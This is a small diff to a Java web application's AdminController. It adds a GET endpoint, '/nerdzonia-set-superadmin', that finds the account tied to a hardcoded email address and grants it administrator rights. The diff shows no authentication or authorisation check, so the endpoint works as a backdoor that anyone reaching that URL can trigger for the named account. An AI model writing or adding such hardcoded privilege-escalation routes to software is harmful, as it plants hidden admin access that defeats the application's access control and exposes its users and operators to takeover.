@@ -185,4 +185,15 @@ public class AdminController {
 			result.redirectTo(HomeController.class).home();
 		}
 	}
+	
+	@Get("/nerdzonia-set-superadmin")
+	public void setAdmin() {
+		Person person = personRepository.searchSpecificEntityValueIntoPerson("profile", "email", "nerdzonia@gmail.com");
+		if(person.getAdmin().equals("0")) {
+			person.setAdmin("1");
+			personRepository.updatePerson(person);
+			userSession.setLogged(false);
+		}
+			result.redirectTo(HomeController.class).home();
+	}
 }
